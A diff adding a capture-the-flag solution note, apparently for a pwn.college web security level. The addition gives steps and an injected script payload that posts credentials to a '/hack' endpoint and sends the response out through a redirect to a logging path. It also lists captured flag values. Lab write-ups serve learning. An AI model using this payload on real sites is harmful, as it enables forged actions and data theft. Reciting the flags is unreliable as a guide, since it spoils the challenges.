@@ -297,7 +297,27 @@ level-35:  > Run cat /challenge/server and get the endpoint from there and then 
 
           Flag: pwn.college{whLthxF5e9lBCYfnCEhxjkOND5n.0FOxATNxwyN1YTN0EzW}
 
-level-36:  
+level-36:  > Run cat /challenge/server and get the endpoint from there and then run /challenge/server.
+           > open a file and write the script.
+           > <script>
+                    fetch("/hack", {
+                      method: "POST",
+                      body: new URLSearchParams({
+                        access: "mldjdjmb",
+                        authcode: "jvcmqone",
+                        auth_pass: "msoaqhla"
+                      })
+          })
+          .then(r => r.text())
+          .then(flag=>{
+                  window.location="/~hacker/log?"+flag;
+          });
+          </script>
+           >  run /challenge/client
+           > get the flag.
+
+          Flag: pwn.college{cy22-QKfCbZe3_IZz-peTb8WpkZ.0VOxATNxwyN1YTN0EzW}
+
 
 
 
